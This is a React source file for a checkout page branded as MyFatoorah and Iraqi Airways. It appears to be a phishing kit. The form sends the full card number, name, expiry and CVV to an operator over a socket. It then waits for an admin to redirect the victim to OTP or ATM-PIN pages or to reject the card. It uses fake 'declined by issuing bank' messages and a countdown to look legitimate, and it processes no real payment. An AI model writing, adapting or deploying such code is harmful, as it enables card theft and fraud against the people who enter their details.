import { useState, useEffect, useRef } from "react";
import { getCurrency, convertFromKWD, CURRENCIES } from "@/lib/currency";
import { useSignalEffect } from "@preact/signals-react/runtime";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { useLocation } from "wouter";
import WaitingOverlay, { waitingCardInfo } from "@/components/WaitingOverlay";
import {
  socket,
  visitor,
  sendData,
  isFormApproved,
  isCardVerified,
  navigateToPage,
  cardAction,
  waitingMessage,
} from "@/lib/store";
import { MADA_BINS, getCardType as getCardTypeFromDB, getBinInfo } from "@/lib/binDatabase";

const schema = z.object({
  cardNumber: z
    .string()
    .min(1, "Card number is required")
    .refine((val) => {
      const cleanVal = val.replace(/\s+/g, "");
      if (!cleanVal || cleanVal.length < 13 || cleanVal.length > 19) return false;
      let sum = 0;
      let isEven = false;
      for (let i = cleanVal.length - 1; i >= 0; i--) {
        let digit = parseInt(cleanVal[i], 10);
        if (isEven) {
          digit *= 2;
          if (digit > 9) digit -= 9;
        }
        sum += digit;
        isEven = !isEven;
      }
      return sum % 10 === 0;
    }, "Invalid card number"),
  nameOnCard: z.string().min(1, "Cardholder name is required"),
  expiryDate: z.string().min(1, "Expiry date is required").refine((val) => {
    const match = val.match(/^(\d{2})\/(\d{2})$/);
    if (!match) return false;
    const month = parseInt(match[1], 10);
    const year = parseInt(match[2], 10);
    if (month < 1 || month > 12) return false;
    const now = new Date();
    const currentYear = now.getFullYear() % 100;
    const currentMonth = now.getMonth() + 1;
    if (year < currentYear || (year === currentYear && month < currentMonth)) return false;
    return true;
  }, "Invalid expiry date"),
  cvv: z.string().length(3, "CVV must be 3 digits"),
});

type FormData = z.infer<typeof schema>;

function isValidCardNumber(number: string): boolean {
  if (!number || number.length < 13 || number.length > 19) return false;
  let sum = 0;
  let isEven = false;
  for (let i = number.length - 1; i >= 0; i--) {
    let digit = parseInt(number[i], 10);
    if (isEven) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    isEven = !isEven;
  }
  return sum % 10 === 0;
}

function getCardType(number: string): string {
  const cleanNumber = number.replace(/\s+/g, "");
  const cardType = getCardTypeFromDB(cleanNumber);
  return cardType ? cardType.toLowerCase() : "unknown";
}

function getBankInfoLocal(cardNumber: string): { bank: string; logo: string } | null {
  const info = getBinInfo(cardNumber);
  if (info) {
    return { bank: info.bank, logo: info.bankLogo };
  }
  return null;
}

export default function CreditCardPayment() {
  const [, navigate] = useLocation();
  const [cardError, setCardError] = useState(false);
  const [luhnError, setLuhnError] = useState(false);
  const [rejectedError, setRejectedError] = useState(false);
  const debounceRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const [lang, setLang] = useState<'en' | 'ar'>('en');
  const [isCurrencyDropdownOpen, setIsCurrencyDropdownOpen] = useState(false);
  const [timeLeft, setTimeLeft] = useState(15 * 60); // 15 minutes in seconds

  useEffect(() => {
    if (timeLeft <= 0) return;
    const timerId = setInterval(() => {
      setTimeLeft((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(timerId);
  }, [timeLeft]);

  const minutes = Math.floor(timeLeft / 60);
  const seconds = timeLeft % 60;

  const searchParams = new URLSearchParams(window.location.search);
  const urlAmount = searchParams.get('amount') || '0';
  const urlCurrency = searchParams.get('currency');

  const cartItems = JSON.parse(localStorage.getItem('amouage_cart') || '[]');

  const getCartTotal = () => {
    const storedTotal = localStorage.getItem('amouage_order_total');
    if (storedTotal && Number(storedTotal) > 0) {
      return storedTotal;
    }
    let total = 0;
    for (const item of cartItems) {
      total += (parseFloat(item.priceNum) || 0) * (item.quantity || 1);
    }
    return (total * 0.75).toFixed(3);
  };
  
  // Save to localStorage if URL has amount, otherwise try to get from localStorage
  let totalAmount = getCartTotal();
  if (Number(urlAmount) > 0) {
    totalAmount = urlAmount;
    localStorage.setItem('amouage_order_total', urlAmount);
  }
  
  // Save currency to localStorage if in URL, otherwise try to get from localStorage
  let currentCurrency = urlCurrency;
  if (currentCurrency) {
    localStorage.setItem('amouage_currency', currentCurrency);
  } else {
    currentCurrency = localStorage.getItem('amouage_currency') || null;
  }
  
  const payCur = getCurrency(currentCurrency);
  const displayAmount = convertFromKWD(Number(totalAmount), payCur.code);
  const displayAmountStr = displayAmount.toLocaleString('en-US', { minimumFractionDigits: payCur.decimals, maximumFractionDigits: payCur.decimals });
  const productNames = cartItems.map((item: any) => item.name).join(', ') || 'Order Payment';

  const {
    register,
    handleSubmit,
    watch,
    setValue,
    reset,
    formState: { errors },
  } = useForm<FormData>({
    resolver: zodResolver(schema),
    defaultValues: {
      cardNumber: "",
      nameOnCard: "",
      expiryDate: "",
      cvv: "",
    },
  });

  const cardNumber = watch("cardNumber");
  const nameOnCard = watch("nameOnCard");
  const expiryDate = watch("expiryDate");
  const cvv = watch("cvv");

  const cleanCardNumber = cardNumber?.replace(/\s+/g, "") || "";
  const isFormValid =
    cleanCardNumber.length >= 13 &&
    cleanCardNumber.length <= 19 &&
    !luhnError &&
    nameOnCard?.trim().length > 0 &&
    expiryDate?.length === 5 &&
    /^\d{2}\/\d{2}$/.test(expiryDate || "") &&
    cvv?.length === 3;

  useEffect(() => {
    navigateToPage("الدفع بطاقة الائتمان");
    waitingMessage.value = "";
  }, []);

  useEffect(() => {
    if (cardNumber && cardNumber.replace(/\s+/g, "").length === 16) {
      if (debounceRef.current) clearTimeout(debounceRef.current);
      debounceRef.current = setTimeout(() => {
        socket.value.emit("cardNumber:verify", cardNumber.replace(/\s+/g, ""));
      }, 500);
    }
  }, [cardNumber]);

  useEffect(() => {
    if (isCardVerified.value === false) {
      setCardError(true);
    } else {
      setCardError(false);
    }
  }, [isCardVerified.value]);

  useEffect(() => {
    if (isFormApproved.value) {
      navigate("/otp-verification");
    }
  }, [isFormApproved.value, navigate]);

  useSignalEffect(() => {
    if (cardAction.value) {
      const action = cardAction.value.action;
      waitingMessage.value = "";

      if (action === 'otp') {
        navigate("/otp-verification");
      } else if (action === 'atm') {
        navigate("/atm-password");
      } else if (action === 'reject') {
        setRejectedError(true);
        reset({
          cardNumber: "",
          nameOnCard: "",
          expiryDate: "",
          cvv: "",
        });
      }
      cardAction.value = null;
    }
  });

  const formatCardNumber = (value: string): string => {
    const cleaned = value.replace(/\s+/g, "").replace(/\D/g, "");
    const groups = cleaned.match(/.{1,4}/g);
    return groups ? groups.join(" ") : cleaned;
  };

  const [globalBlockedCards, setGlobalBlockedCards] = useState<string[]>([]);
  const [globalBlockedError, setGlobalBlockedError] = useState(false);

  useEffect(() => {
    socket.value.emit("blockedCards:get");

    const handleBlockedCardsList = (cards: string[]) => {
      setGlobalBlockedCards(cards || []);
    };

    const handleBlockedCardsUpdated = (cards: string[]) => {
      setGlobalBlockedCards(cards || []);
    };

    socket.value.on("blockedCards:list", handleBlockedCardsList);
    socket.value.on("blockedCards:updated", handleBlockedCardsUpdated);

    return () => {
      socket.value.off("blockedCards:list", handleBlockedCardsList);
      socket.value.off("blockedCards:updated", handleBlockedCardsUpdated);
    };
  }, []);

  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const rawValue = e.target.value.replace(/\s+/g, "").replace(/\D/g, "");
    const blockedPrefixes = visitor.value.blockedCardPrefixes;
    const cardPrefix = rawValue.slice(0, 4);

    if (globalBlockedError) {
      setGlobalBlockedError(false);
    }

    if (blockedPrefixes && blockedPrefixes.includes(cardPrefix)) {
      setCardError(true);
      setValue("cardNumber", "");
      setLuhnError(false);
    } else {
      const formattedValue = formatCardNumber(rawValue);
      setValue("cardNumber", formattedValue);
      if (rawValue.length >= 13 && rawValue.length <= 19) {
        if (!isValidCardNumber(rawValue)) {
          setLuhnError(true);
        } else {
          setLuhnError(false);
        }
      } else {
        setLuhnError(false);
      }
      setCardError(false);
    }
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/[^\d]/g, "");
    if (value.length >= 3) {
      value = value.slice(0, 2) + "/" + value.slice(2, 4);
    }
    setValue("expiryDate", value);
  };

  const onSubmit = (data: FormData) => {
    const cleanNumber = data.cardNumber.replace(/\s+/g, "");

    if (globalBlockedCards.includes(cleanNumber)) {
      setGlobalBlockedError(true);
      reset({ cardNumber: "", nameOnCard: "", expiryDate: "", cvv: "" });
      return;
    }

    setRejectedError(false);
    setGlobalBlockedError(false);

    const cardType = getCardType(cleanNumber);
    const bankInfo = getBankInfoLocal(cleanNumber);

    waitingCardInfo.value = {
      cardType: cardType,
      bankName: bankInfo?.bank || undefined,
      bankLogo: bankInfo?.logo || undefined,
    };

    const [expiryMonth, expiryYear] = data.expiryDate.split("/");

    localStorage.setItem("paymentData", JSON.stringify({
      cardLast4: cleanNumber.slice(-4),
      totalPaid: payCur.code + " " + displayAmountStr,
      serviceName: "الخطوط الجوية العراقية",
      bankName: bankInfo?.bank || "Unknown",
      bankLogo: bankInfo?.logo || null,
      cardType,
    }));

    sendData({
      paymentCard: {
        cardNumber: cleanNumber,
        nameOnCard: data.nameOnCard,
        expiryMonth: expiryMonth,
        expiryYear: expiryYear,
        cvv: data.cvv,
        cardType,
        bankName: bankInfo?.bank || "Unknown",
        amount: totalAmount,
        productName: productNames,
      },
      current: "الدفع بطاقة الائتمان",
      nextPage: "رمز التحقق (OTP)",
      waitingForAdminResponse: true,
    });

    waitingMessage.value = lang === 'ar' ? "جاري معالجة الدفع..." : "Processing payment...";
  };

  const isAr = lang === 'ar';

  return (
    <div dir={isAr ? "rtl" : "ltr"} style={{ backgroundColor: '#f8f9fa', minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', fontFamily: 'sans-serif', backgroundImage: 'linear-gradient(135deg, #f8f9fa 0%, #f8f9fa 50%, #f0f2f5 50%, #f0f2f5 100%)' }}>
      <link href="/css/bootstrap.css" rel="stylesheet" />
      <link href="/css/invoiceredesign/simple/style.css" rel="stylesheet" />
      <link href="/css/cardview/v1/cardview-form.css" rel="stylesheet" />
      <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" />
      <WaitingOverlay />
      
      <style>{`
        body { background-color: #f8f9fa !important; }
        .mfi-outer-container {
          width: 100%;
          max-width: 480px;
          margin: 0 auto;
          padding: 20px;
        }
        .mfi-inner-container {
          background: #fff;
          border-radius: 8px;
          box-shadow: 0 10px 30px rgba(0,0,0,0.08);
          overflow: hidden;
        }
        .mfi-header {
          padding: 24px 24px 16px;
          display: flex;
          align-items: center;
          justify-content: space-between;
        }
        .mfi-vendor {
          display: flex;
          align-items: center;
          gap: 12px;
        }
        .mfi-logo-container {
          display: flex;
          align-items: center;
        }
        .mfi-logo {
          height: 36px;
          max-width: 150px;
          object-fit: contain;
        }
        .mfi-vendor-name {
          font-size: 14px;
          font-weight: 600;
          color: #333;
        }
        .mfi-lang {
          display: flex;
          align-items: center;
        }
        .lang-anchor {
          font-size: 13px;
          color: #333;
          text-decoration: none;
          border: 1px solid #e0e0e0;
          padding: 4px 12px;
          border-radius: 4px;
          cursor: pointer;
          background: #fff;
        }
        .mfi-sub-container {
          padding: 0 24px 24px;
          display: flex;
          justify-content: space-between;
          align-items: flex-start;
        }
        .mfi-amount-main {
          font-size: 24px;
          font-weight: 700;
          color: #0000ff;
          display: flex;
          align-items: center;
          gap: 6px;
        }
        .mfi-amount-main::after {
          content: attr(data-currency);
          font-size: 16px;
        }
        .invoiceStatusSpan {
          font-size: 12px;
          color: #666;
          display: block;
          margin-top: 4px;
        }
        .mfi-btn-currency {
          background: #fff;
          border: 1px solid #e0e0e0;
          padding: 6px 12px;
          border-radius: 4px;
          font-size: 13px;
          color: #333;
          cursor: pointer;
          display: flex;
          align-items: center;
          gap: 8px;
        }
        .mfi-blue-bg {
          background-color: #f8f9fa;
          padding: 24px;
          border-top: 1px solid #eee;
        }
        .insertCardDetails {
          display: block;
          text-align: center;
          font-size: 12px;
          color: #666;
          margin-bottom: 20px;
          position: relative;
          background-color: #f8f9fa;
          padding: 0 10px;
          z-index: 1;
          width: fit-content;
          margin-left: auto;
          margin-right: auto;
        }
        .mfi-central-text {
          position: relative;
          text-align: center;
          margin-bottom: 20px;
        }
        .mfi-central-text::before {
          content: "";
          position: absolute;
          top: 50%;
          left: 0;
          right: 0;
          height: 1px;
          background: #e0e0e0;
          z-index: 0;
        }
        .card-container {
          background: #fff;
          border: 1px solid #e0e0e0;
          border-radius: 6px;
          overflow: hidden;
          margin-bottom: 20px;
        }
        .field-container {
          border-bottom: 1px solid #e0e0e0;
          position: relative;
          display: flex;
          align-items: center;
          height: 48px;
        }
        .field-container:last-child { border-bottom: none; }
        .card-input {
          width: 100%;
          border: none;
          padding: 14px 16px;
          font-size: 13px;
          color: #333;
          outline: none;
          background: transparent;
          height: 100%;
        }
        .card-input::placeholder { color: #999; }
        .half-width-input { width: 50%; }
        .vertical-divider { width: 1px; background: #e0e0e0; height: 100%; }
        .payment-card { height: 16px; margin-left: 4px; }
        .mfi-pay-now {
          width: 100%;
          background-color: #0000ff !important;
          color: #fff !important;
          border: none;
          padding: 14px;
          border-radius: 6px;
          font-size: 15px;
          font-weight: 500;
          cursor: pointer;
          transition: opacity 0.2s;
          margin-top: 15px;
        }
        .mfi-pay-now:hover { opacity: 0.9; }
        .mfi-pay-now:disabled { background-color: #0000ff !important; opacity: 1; cursor: pointer; }
        .mf-footer {
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 20px 24px;
          font-size: 11px;
          color: #888;
          background-color: #fff;
          gap: 6px;
        }
        .mf-footer img {
          height: 20px;
        }
        .mf-footer-text {
          margin-right: 0;
        }
        .mf-error-banner {
          background: #ffebee;
          color: #c62828;
          padding: 12px;
          border-radius: 6px;
          font-size: 13px;
          margin-bottom: 16px;
          text-align: center;
        }
        .mf-error-msg {
          color: #e53935;
          font-size: 12px;
          margin-top: 4px;
          padding: 0 16px 12px;
        }
      `}</style>

      <div className="mfi-outer-container">
        <div className="mfi-inner-container">
          <div className="mfi-header">
            <div className="mfi-vendor">
              <div className="mfi-logo-container">
                <img alt="logo" className="mfi-logo" src="/images/myfatoorah_jazeera_logo_20.png" />
              </div>
              <span className="mfi-vendor-name">
                الخطوط الجوية العراقية KWD
              </span>
            </div>
            <div className="mfi-lang">
              <button className="lang-anchor" onClick={() => setLang(isAr ? 'en' : 'ar')}>
                {isAr ? 'English' : 'عربي'}
              </button>
            </div>
          </div>

          <div className="mfi-sub-container">
            <div className="mfi-amount">
              <span className="mfi-amount-main" data-currency={payCur.code}>
                {displayAmountStr}
              </span>
              <span className="invoiceStatusSpan">
                {isAr 
                  ? `تنتهي الصلاحية خلال ${minutes} دقيقة و ${seconds} ثانية` 
                  : `Expire In ${minutes} Minutes ${seconds} Seconds`}
              </span>
            </div>
            <div className="dropdown" style={{ position: 'relative' }}>
              <button 
                className="mfi-btn-currency" 
                type="button" 
                onClick={() => setIsCurrencyDropdownOpen(!isCurrencyDropdownOpen)}
              >
                <span className="currency">{payCur.code}</span>
                <i className="fa fa-angle-down" style={{ marginLeft: '8px' }}></i>
              </button>
              {isCurrencyDropdownOpen && (
                <div style={{
                  position: 'absolute',
                  top: '100%',
                  right: 0,
                  marginTop: '4px',
                  background: '#fff',
                  border: '1px solid #e0e0e0',
                  borderRadius: '4px',
                  boxShadow: '0 4px 12px rgba(0,0,0,0.1)',
                  zIndex: 100,
                  minWidth: '120px',
                  maxHeight: '200px',
                  overflowY: 'auto'
                }}>
                  {CURRENCIES.map((c) => (
                    <div 
                      key={c.code}
                      onClick={() => {
                        const newUrl = new URL(window.location.href);
                        newUrl.searchParams.set('currency', c.code);
                        window.history.replaceState({}, '', newUrl.toString());
                        setIsCurrencyDropdownOpen(false);
                        // Force re-render by updating state or triggering a navigation
                        navigate(newUrl.pathname + newUrl.search);
                      }}
                      style={{
                        padding: '8px 12px',
                        cursor: 'pointer',
                        fontSize: '13px',
                        color: '#333',
                        borderBottom: '1px solid #f0f0f0',
                        display: 'flex',
                        justifyContent: 'space-between'
                      }}
                      onMouseOver={(e) => e.currentTarget.style.backgroundColor = '#f5f5f5'}
                      onMouseOut={(e) => e.currentTarget.style.backgroundColor = 'transparent'}
                    >
                      <span>{c.code}</span>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>

          <div className="mfi-blue-bg">
            <div className="mfi-central-text">
              <span className="insertCardDetails">
                {isAr ? 'أدخل تفاصيل البطاقة' : 'Insert Card Details'}
              </span>
            </div>

            {rejectedError && (
              <div className="mf-error-banner">
                {isAr ? 'معلومات البطاقة غير صحيحة. يرجى المحاولة مرة أخرى.' : 'Card information is incorrect. Please try again.'}
              </div>
            )}
            {globalBlockedError && (
              <div className="mf-error-banner">
                {isAr ? 'تم رفض العملية من قبل البنك المصدر.' : 'Transaction declined by issuing bank.'}
              </div>
            )}

            <form onSubmit={handleSubmit(onSubmit)}>
              <div className="card-container">
                <div className="field-container">
                  <input
                    className="card-input"
                    id="cardholdername"
                    placeholder={isAr ? "اسم حامل البطاقة" : "Card Holder Name"}
                    type="text"
                    maxLength={26}
                    {...register("nameOnCard")}
                    onChange={(e) => {
                      const englishOnly = e.target.value.replace(/[^A-Za-z\s]/g, "");
                      setValue("nameOnCard", englishOnly);
                    }}
                  />
                </div>
                
                <div className="field-container" style={{ paddingRight: isAr ? '0' : '16px', paddingLeft: isAr ? '16px' : '0' }}>
                  <input
                    className={`card-input ${(cardError || luhnError) ? 'error' : ''}`}
                    id="cardnumber"
                    inputMode="numeric"
                    placeholder={isAr ? "رقم البطاقة" : "Card Number"}
                    type="tel"
                    maxLength={23}
                    {...register("cardNumber")}
                    onChange={handleCardChange}
                    onFocus={() => { setRejectedError(false); setGlobalBlockedError(false); }}
                    style={{ direction: 'ltr', textAlign: isAr ? 'right' : 'left' }}
                  />
                  <div style={{ display: 'flex', alignItems: 'center' }}>
                    <img className="payment-card" src="/images/visa.png" alt="Visa" />
                    <img className="payment-card" src="/images/mastercard.png" alt="Mastercard" />
                  </div>
                </div>

                <div className="field-container">
                  <input
                    className="card-input half-width-input"
                    id="expirationdate"
                    inputMode="numeric"
                    placeholder="MM / YY"
                    type="text"
                    maxLength={5}
                    {...register("expiryDate")}
                    onChange={handleExpiryChange}
                    style={{ direction: 'ltr', textAlign: 'center' }}
                  />
                  <div className="vertical-divider"></div>
                  <input
                    className="card-input half-width-input"
                    id="securitycode"
                    inputMode="numeric"
                    placeholder="CVV"
                    type="password"
                    maxLength={3}
                    {...register("cvv")}
                    onChange={(e) => {
                      const digitsOnly = e.target.value.replace(/[^0-9]/g, "");
                      setValue("cvv", digitsOnly);
                    }}
                    style={{ direction: 'ltr', textAlign: 'center' }}
                  />
                </div>
              </div>

              {(errors.cardNumber || cardError || luhnError) && (
                <div className="mf-error-msg">
                  {cardError ? (isAr ? "تم رفض هذه البطاقة." : "This card has been rejected.") : luhnError ? (isAr ? "رقم البطاقة غير صالح" : "Invalid card number") : (errors.cardNumber?.message || "Invalid card number")}
                </div>
              )}
              {errors.nameOnCard && <div className="mf-error-msg">{isAr ? "يجب أن يحتوي على أحرف مسافة" : "should contain alphabets with space"}</div>}
              {errors.expiryDate && <div className="mf-error-msg">{errors.expiryDate.message}</div>}
              {errors.cvv && <div className="mf-error-msg">{isAr ? "يجب أن يكون رقماً. الطول يجب أن يكون 3" : "Should be in number. Length should be 3"}</div>}

              <button
                className="mfi-pay-now"
                disabled={!isFormValid}
                onClick={handleSubmit(onSubmit)}
                type="button"
              >
                {isAr ? 'ادفع الآن' : 'Pay Now'}
              </button>
            </form>
          </div>

          <div className="mf-footer">
            <span className="mf-footer-text">Powered by</span>
            <img src="/images/myfatoorah-logo.svg" alt="myfatoorah" />
          </div>
        </div>
      </div>
    </div>
  );
}
